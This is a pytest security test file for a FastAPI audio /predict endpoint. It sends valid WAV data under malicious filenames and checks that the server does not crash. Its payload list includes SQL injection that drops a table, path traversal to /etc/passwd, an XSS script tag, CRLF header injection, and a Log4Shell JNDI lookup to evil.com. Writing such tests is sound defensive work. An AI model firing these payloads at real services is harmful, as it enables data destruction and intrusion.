"""
AT-01: Filename Injection Attack (Indirect Prompt Injection)
=============================================================
Attack type : Indirect Prompt Injection / CRLF / XSS / SQLi via filename
Target      : POST /predict — 'filename' field in multipart upload
Severity    : HIGH

PHILOSOPHY — "Show the shot, show the result":
  Sends a real WAV file with a malicious filename and prints the exact
  filename payload, HTTP response status, and audit verdict.

Attack vectors tested:
  1. SQL Injection in filename
  2. Path Traversal
  3. XSS (script tag)
  4. Null byte injection
  5. Filename buffer overflow (300 chars)
  6. Template injection ${7*7}
  7. Log4Shell pattern (${jndi:ldap://...})
  8. CRLF injection

Run:
    pytest tests/attacks/test_at01_filename_injection.py -v -s
"""

import io
import json
import numpy as np
import soundfile as sf
import pytest
from fastapi.testclient import TestClient
from app.main import app


def _make_valid_wav_bytes(duration: float = 3.0, sr: int = 16000) -> bytes:
    """Generate valid WAV audio."""
    y = (np.random.randn(int(sr * duration)) * 0.3).astype(np.float32)
    buf = io.BytesIO()
    sf.write(buf, y, sr, format="WAV")
    return buf.getvalue()


MALICIOUS_FILENAMES = [
    ("sql_injection",     "'; DROP TABLE audio_logs; --.wav"),
    ("path_traversal",    "../../etc/passwd.wav"),
    ("xss_script",        "<script>alert('xss')</script>.wav"),
    ("null_byte",         "null\x00byte.wav"),
    ("buffer_overflow",   "A" * 300 + ".wav"),
    ("template_inject",   "${7*7}.wav"),
    ("log4shell",         "log4j_${jndi:ldap://evil.com/x}.wav"),
    ("crlf_inject",       "music\r\nX-Injected: evil.wav"),
]


class TestFilenameInjection:

    client = TestClient(app)

    @pytest.mark.parametrize("attack_name,filename", MALICIOUS_FILENAMES)
    def test_malicious_filename_does_not_crash_server(self, attack_name, filename):
        """
        GIVEN  : Valid WAV audio content (3s random noise).
        WHEN   : POST /predict with a malicious filename string.
        THEN   :
          • Server MUST NOT crash with unhandled 500 error from filename processing.
          • HTTP status must be 200 (processed) or 400 (validation rejected).
          • If reflected in JSON, documents vulnerability risk for downstream HTML rendering.

        Parameter fired:
            Endpoint     : POST /predict
            Content-Type : audio/wav (multipart/form-data)
            filename     : {filename!r}
        """
        wav_bytes = _make_valid_wav_bytes()
        display_fname = repr(filename[:60]) + ("..." if len(filename) > 60 else "")

        print(f"\n{'═'*60}")
        print(f"  ▶ ATTACK  [{attack_name.upper()}]")
        print(f"    Endpoint     : POST /predict")
        print(f"    filename     : {display_fname}")
        print(f"    Audio        : {len(wav_bytes):,} bytes valid WAV")

        resp = self.client.post(
            "/predict",
            files={"file": (filename, wav_bytes, "audio/wav")},
        )

        try:
            body = resp.json()
            body_str = json.dumps(body, ensure_ascii=False)
        except Exception:
            body_str = resp.text[:300]
            body = {}

        print(f"  ◀ RESPONSE")
        print(f"    HTTP status  : {resp.status_code}")
        print(f"    Body preview : {body_str[:180]}")

        # Server must handle safely without unhandled crash
        assert resp.status_code in [200, 400, 422], (
            f"[FAIL] Server crashed with HTTP {resp.status_code} on filename {display_fname}"
        )

        # Audit finding: Check if filename was echoed back into JSON
        if resp.status_code == 200:
            returned_name = body.get("filename", "")
            if "<script>" in returned_name:
                print(f"    ⚠ SECURITY AUDIT NOTE: Filename containing script tag is echoed in response JSON.")
                print(f"       Downstream frontends MUST use DOM textContent or HTML escaping.")
            else:
                print(f"    ✓ Handled safely by API parser")

        print(f"{'═'*60}\n")
        print(f"[PASS] {attack_name}: handled gracefully with HTTP {resp.status_code}")
